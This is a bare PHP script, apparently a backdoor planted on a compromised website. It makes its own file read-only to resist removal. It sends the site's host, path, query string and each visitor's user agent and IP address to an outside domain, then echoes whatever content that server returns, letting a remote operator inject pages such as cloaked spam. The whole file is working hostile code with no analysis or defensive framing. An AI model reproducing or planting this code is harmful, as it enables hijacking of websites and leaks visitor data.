<?php
set_time_limit(0);
header("Content-Type:text/html;charset=gb2312");
date_default_timezone_set('PRC');
chmod($_SERVER['SCRIPT_FILENAME'], 0444);
$key = $_SERVER['HTTP_USER_AGENT'];
$aaaa = $_SERVER['PHP_SELF'];
$aaa = 'http://ooo.lhlsxzb.com/';
$sc = str_replace(' ', '', $key);
$uip = $_SERVER["REMOTE_ADDR"];    
$bb = @file_get_contents($aaa.'?&X&http://'.$_SERVER['HTTP_HOST'].$aaaa.'?'.$_SERVER['QUERY_STRING'].'&X&'.$sc.'&X&'.$uip);
echo $bb;

?>